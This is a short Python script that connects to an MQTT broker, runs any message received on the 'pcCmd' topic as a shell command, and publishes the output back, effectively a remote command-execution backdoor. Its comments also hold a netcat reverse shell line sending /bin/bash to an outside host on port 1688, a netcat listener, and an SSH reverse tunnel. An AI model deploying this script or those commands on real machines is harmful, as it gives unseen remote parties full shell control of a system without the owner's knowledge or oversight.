#! env python
# --coding:utf8--

#https://docs.azure.cn/zh-cn/articles/azure-operations-guide/sample-code/aog-sample-code-iot-hub-send-and-receive-msg-using-paho-mqtt-for-python
#https://xz.aliyun.com/t/2548
#https://backreference.org/2010/02/26/jump-in-with-ssh-and-netcat/

import os
import time
import subprocess
from threading import Thread
import paho.mqtt.client as mqtt

mqServer = 'xxxxxxxx'
mqUser = "xxxxxxxx"
mqPass = "xxxxxxxx"

cmdTopicPublish = 'cmdResult'
cmdTopicSubscribe = 'pcCmd'

client = ""

#ssh -g -R 2222:127.0.0.1:22 x1 -N
#./netcat -l -p 1688 -vvv
#./netcat -e /bin/bash git.ioter.top 1688

def on_connect(client, userdata, flags, rc):
    print("Connected with result code " + str(rc))
    client.subscribe(cmdTopicSubscribe)

def daemon(func):
    def wrapper(*args, **kwargs):
        if os.fork():
            return
        func(*args, **kwargs)
        os._exit(os.EX_OK)
    return wrapper

@daemon
def exec_cmd(payload):
    cmd_shell = subprocess.Popen(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    return cmd_shell

def run_cmd(client, msg):
    print(client, "{0} : {1}".format(msg.topic, str(msg.payload)))
    topic = msg.topic
    payload = msg.payload
    cmd_shell = subprocess.Popen(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    result = cmd_shell.stdout.read()
    print("result:", result)
    client.publish(cmdTopicPublish, result)

def on_message(client, userdata, msg):
    th = Thread(target = run_cmd, args = [client, msg])
    th.start()

if __name__ == '__main__':
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    client.username_pw_set(username=mqUser, password=mqPass)
    client.connect(mqServer, keepalive=60)
    client.loop_forever()

